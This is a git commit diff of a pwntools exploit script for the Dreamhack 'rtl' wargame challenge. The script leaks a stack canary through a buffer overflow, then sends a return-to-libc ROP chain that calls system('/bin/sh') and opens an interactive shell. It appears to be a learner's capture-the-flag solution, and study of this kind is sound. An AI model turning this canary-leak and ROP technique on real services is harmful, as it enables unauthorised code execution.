3c37d8089263fbaf5f10f54bc60abcbfbb7f83d8
KayTii <dkhoitran2106@gmail.com>
2025-03-27 16:26:05 +0700

    exp.py

--- Dreamhack/rtl/exp.py
+++ Dreamhack/rtl/exp.py
@@ -1,21 +1,22 @@
 from pwn import *
 
-#p = process('./rtl')
-p = remote('host1.dreamhack.games', 22347)
-#gdb.attach(p, api=True)
+p = process('./rtl')
+e = ELF('./rtl')
+gdb.attach(p, api=True)
 
-buf = b"a"*57
-p.sendafter(b'Buf: ',buf)
+buf = b'a'*(0x40-0x8+1)
+p.sendafter(b"Buf: ", buf)
 p.recvuntil(buf)
-canary = u64(b"\x00"+p.recv(7))
-log.info('Canary' +  hex(canary))
+canary = u64(b'\x00' + p.recvn(7))
+log.info('Canary ' + hex(canary))
+system = e.plt['system']
+binsh = 0x400874 #search /bin/sh
+rdi_ret = 0x0000000000400853 #ROPgadget --binary ./rtl | grep "pop rdi ; ret"
+ret = 0x0000000000400285 #ROPgadget --binary ./rtl | grep "ret"
 
-pop_rdi_ret = 0x0000000000400853 # ROPgadget --binary ./rtl | grep "pop rdi ; ret"
-bin_sh = 0x400874 # search -t string /bin/sh
-sys_plot = 0x00000000004005d0 # info func @plt
-ret = 0x0000000000400285 # ROPgadget --binary=./rtl | grep ": ret"
-
-payload = b"A"*56 + p64(canary) + b"A"*8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_plot)
+payload = b'a'*(0x40-0x8) + p64(canary) + b'a'*8
+payload += p64(ret) #prevent error cause by movaps
+payload += p64(rdi_ret) +p64(binsh) + p64(system) #system("/bin/sh")
 p.sendafter(b'Buf: ', payload)
 
 p.interactive()
